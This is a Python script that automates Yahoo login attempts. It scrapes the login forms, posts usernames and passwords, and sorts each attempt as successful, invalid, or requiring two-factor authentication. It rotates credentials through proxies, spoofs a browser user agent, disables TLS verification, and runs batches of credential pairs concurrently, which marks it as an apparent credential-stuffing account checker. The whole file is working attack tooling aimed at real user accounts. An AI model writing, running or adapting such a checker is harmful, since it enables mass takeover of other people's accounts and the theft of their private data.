import httpx
import asyncio
import re
import time

_PROXY_CONFIG = None

_USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'

RE_FORM_ELEMENTS = re.compile(
    r'<(input|button)[^>]*(?:name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']|value=["\']([^"\']*)["\'][^>]*name=["\']([^"\']+)["\'])',
    re.IGNORECASE
)
RE_ACTION = re.compile(r'action=["\']([^"\']+)["\']', re.IGNORECASE)

def parse_proxy(proxy_string):
    if not proxy_string: return None
    proxy_string = proxy_string.strip()
    try:
        if '@' in proxy_string:
            creds, addr = proxy_string.split('@')
            user, pwd = creds.split(':', 1)
            host, port = addr.split(':', 1)
            return {"host": host, "port": port, "user": user, "pass": pwd}
        if ',' in proxy_string:
            parts = proxy_string.split(',')
            if len(parts) == 4: return {"host": parts[0], "port": parts[1], "user": parts[2], "pass": parts[3]}
        parts = proxy_string.split(':')
        if len(parts) >= 2:
            return {"host": parts[0], "port": parts[1], "user": ':'.join(parts[2:-1]) if len(parts) > 2 else None, "pass": parts[-1] if len(parts) > 2 else None}
    except Exception: pass
    return None

def set_proxies(proxy_string):
    global _PROXY_CONFIG
    _PROXY_CONFIG = parse_proxy(proxy_string)

def _get_httpx_proxy_url():
    if not _PROXY_CONFIG: return None
    if _PROXY_CONFIG.get('user'):
        return f"http://{_PROXY_CONFIG['user']}:{_PROXY_CONFIG['pass']}@{_PROXY_CONFIG['host']}:{_PROXY_CONFIG['port']}"
    return f"http://{_PROXY_CONFIG['host']}:{_PROXY_CONFIG['port']}"

def _get_form_data_turbo(text, url):
    data = {}
    
    for match in RE_FORM_ELEMENTS.findall(text):
        tag = match[0].lower()
        if match[1]:
            name, val = match[1], match[2]
        else:
            name, val = match[4], match[3]
            
        if tag == 'input':
            data[name] = val
        elif tag == 'button' and name in ('signin', 'verifyPassword', 'crumb'):
            data[name] = val

    action_match = RE_ACTION.search(text)
    action_url = url
    if action_match:
        action = action_match.group(1).replace("&amp;", "&")
        if action.startswith("http"): action_url = action
        elif action.startswith("/"): action_url = "https://login.yahoo.com" + action
            
    return action_url, data

async def login_async(username, password):
    proxy_url = _get_httpx_proxy_url()
    
    headers = {
        'User-Agent': _USER_AGENT,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Origin': 'https://login.yahoo.com',
        'Connection': 'keep-alive',
    }

    http2_enabled = False
    try:
        import h2
        http2_enabled = True
    except ImportError:
        pass

    timeout_config = httpx.Timeout(5.0, connect=3.0)

    try:
        async with httpx.AsyncClient(
            http2=http2_enabled,
            follow_redirects=True, 
            proxy=proxy_url, 
            verify=False,
            timeout=timeout_config
        ) as session:
            
            initial_url = "https://login.yahoo.com/"
            resp = await session.get(initial_url, headers=headers)
            txt = resp.text
            
            action_url, form_data = _get_form_data_turbo(txt, initial_url)
            
            if not form_data or 'acrumb' not in form_data:
                return "ERROR", "Page init failed (No crumb)"

            form_data['username'] = username
            headers['Referer'] = initial_url
            
            resp = await session.post(action_url, data=form_data, headers=headers)
            txt = resp.text
            
            if "messages.ERROR_INVALID_USERNAME" in txt: 
                return "INVALID", "Invalid Username"

            curr_url = str(resp.url)
            pwd_action_url, pwd_form_data = _get_form_data_turbo(txt, curr_url)

            pwd_form_data['password'] = password
            
            headers['Referer'] = curr_url
            resp = await session.post(pwd_action_url, data=pwd_form_data, headers=headers)
            txt = resp.text
            final_url = str(resp.url)

            if 'L' in session.cookies: 
                return "SUCCESS", "Login successful (Fast)"
            
            if "device-finger-print" in txt:
                fp_action, fp_data = _get_form_data_turbo(txt, final_url)
                if fp_data:
                    headers['Referer'] = final_url
                    resp = await session.post(fp_action, data=fp_data, headers=headers)
                    if 'L' in session.cookies: 
                        return "SUCCESS", "Login successful (After Fingerprint)"
                    final_url = str(resp.url)
                    txt = resp.text

            if "messages.ERROR_INVALID_PASSWORD" in txt or "Mot de passe incorrect" in txt:
                 return "INVALID", "Invalid Password"
            
            if "challenge" in final_url: 
                return "2FA", "2FA Required"
            
            if resp.status_code == 200:
                if "mail.yahoo" in final_url or "my-account" in txt:
                    return "SUCCESS", "Login successful (Account)"
                if "yahoo.com" in final_url and "login.yahoo.com" not in final_url:
                    return "SUCCESS", "Login successful (Home)"

            return "UNKNOWN", f"Manual check required: {final_url}"

    except httpx.ConnectError: return "ERROR", "Proxy Error"
    except httpx.TimeoutException: return "ERROR", "Timeout"
    except Exception as e: return "ERROR", str(e)

def login(username, password):
    t0 = time.perf_counter()
    try:
        status, message = asyncio.run(login_async(username, password))
    except Exception as e:
        status, message = "ERROR", f"Crash: {e}"
    
    return status, message, int((time.perf_counter() - t0) * 1000)

async def _batch_worker(queue, results):
    while True:
        try:
            item = await queue.get()
            username, password = item
            status, msg = await login_async(username, password)
            results.append((username, status, msg))
            queue.task_done()
        except asyncio.CancelledError: break
        except Exception: queue.task_done()

async def run_batch(credentials_list, concurrency=10):
    queue = asyncio.Queue()
    results = []
    for creds in credentials_list: queue.put_nowait(creds)
    workers = [asyncio.create_task(_batch_worker(queue, results)) for _ in range(min(concurrency, len(credentials_list)))]
    await queue.join()
    for w in workers: w.cancel()
    return results